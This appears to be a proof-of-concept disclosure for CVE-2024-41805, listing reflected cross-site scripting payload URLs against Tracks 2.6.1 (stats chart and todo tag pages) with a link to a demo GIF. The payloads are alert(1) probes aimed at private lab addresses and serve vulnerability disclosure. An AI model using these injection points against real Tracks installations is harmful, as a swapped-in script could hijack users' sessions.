 CVE-2024-41805


Action to trigger: None

Note: No sample data needed

Version:  Tracks 2.6.1

Authenticated: Yes

User: Admin (possibly others)

Vendor Website: https://www.getontracks.org/



```http://192.168.124.97/stats/show_selected_actions_from_chart/art?index=test><script>alert(1)<%2fscript>```

```http://192.168.124.97/stats/show_selected_actions_from_chart/avrt?index=test><script>alert(1)<%2fscript>```

```http://192.168.124.253/todos/all_done/tag/starred'-alert(1)-'```

```http://192.168.124.253/todos/all_done/tag/test'-alert(1)-'```

```http://192.168.124.253/todos/done/tag/starred'-alert(1)-'```

```http://192.168.124.253/todos/tag/starred%3cscript%3ealert(1)%3c/script%3e```


DEMO:
![](https://github.com/4rdr/proofs/blob/main/gifs/Tracks_2.6.1_Multiple_Reflected_XSS.gif)
